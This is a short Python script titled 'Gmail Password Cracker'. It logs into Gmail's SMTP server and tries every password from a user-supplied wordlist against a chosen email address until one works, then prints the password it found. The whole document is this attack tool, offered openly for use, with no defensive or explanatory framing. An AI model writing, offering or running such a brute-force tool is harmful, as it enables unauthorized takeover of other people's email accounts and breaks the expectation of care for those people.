# Gmail Password Cracker

import smtplib

server = smtplib.SMTP("smtp.gmail.com",587)
server.ehlo()
server.starttls()

user = input("[?] Enter email id ")
pswd = input("[?] Enter dictionary ")
pswd = open(pswd,"r")

for p in pswd:
	try:
		#print("testing " + str(p),end="\r")
		server.login(user,p)
		print("[!] Password found",p)
		break
	except smtplib.SMTPAuthenticationError:
		#msg = "Testing " + p
		print(f"testing {p}", end="\r")

#EOF
